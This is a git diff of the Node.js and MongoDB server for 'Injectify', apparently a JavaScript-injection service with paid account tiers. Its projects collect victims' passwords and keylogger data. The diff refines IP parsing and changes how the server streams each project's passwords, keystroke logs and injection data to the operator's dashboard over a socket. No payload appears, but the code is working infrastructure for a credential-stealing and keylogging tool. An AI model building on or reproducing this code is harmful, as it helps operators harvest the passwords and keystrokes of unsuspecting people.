@@ -86,8 +86,10 @@ MongoClient.connect(config.mongodb, (err, client) => {
   const db = client.db('injectify')
 
   function getIP (ip) {
-    if (ip === '::1' || ip === '::ffff:127.0.0.1') {
+    if (ip === '::1') {
       return '127.0.0.1'
+    } else if (ip.startsWith('::ffff:')) {
+      return ip.slice(7)
     } else {
       return ip
     }
@@ -97,6 +99,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
     let refresh
     let prevState
     let injectWatcher
+    let type
     var getToken = code => {
       return new Promise((resolve, reject) => {
         if (!code) {
@@ -561,6 +564,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
     socket.on('project:read', project => {
       if (project.name && globalToken) {
         if (project.type === 'overview' || project.type === 'passwords' || project.type === 'keylogger' || project.type === 'inject' || project.type === 'config') {
+          type = project.type
           getUser(globalToken).then(user => {
             getProject(project.name, user).then(thisProject => {
               if (project.type === 'overview' || project.type === 'config') {
@@ -582,14 +586,25 @@ MongoClient.connect(config.mongodb, (err, client) => {
               database(user).then(doc => {
                 let timeout = 1000
                 // if (doc.payment.account_type.toLowerCase() != "free") {
-                if ((doc.payment.account_type.toLowerCase() === 'elite')) timeout = 100
+                if (doc.payment.account_type.toLowerCase() === 'elite') timeout = 100
                 clearInterval(refresh)
                 getProject(project.name, user).then(thisProject => {
                   refresh = setInterval(() => {
                     getProject(project.name, user).then(thisProject => {
-                      if (JSON.stringify(thisProject.doc) === prevState) return
-                      //socket.emit('project:read', thisProject.doc)
-                      prevState = JSON.stringify(thisProject.doc)
+                      let data = thisProject.doc
+                      if (type === 'overview' || type === 'config') {
+                        delete data.passwords
+                        delete data.keylogger
+                        delete data.inject
+                      } else {
+                        data = data[type]
+                      }
+                      if (JSON.stringify(data) === prevState) return
+                      socket.emit('project:read', {
+                        type: type,
+                        doc: data
+                      })
+                      prevState = JSON.stringify(data)
                     }).catch(e => {
                       socket.emit('err', {
                         title: e.title,
@@ -1217,7 +1232,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
       }
 
       let agent = parseAgent(socket.headers['user-agent'])
-      let os
+      let os = false
 
       /**
        * Parse user-agent from the Injectify Electron application
@@ -1286,7 +1301,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
             console.error(e)
           }
         } else {
-          os = null
+          os = false
         }
       }
       
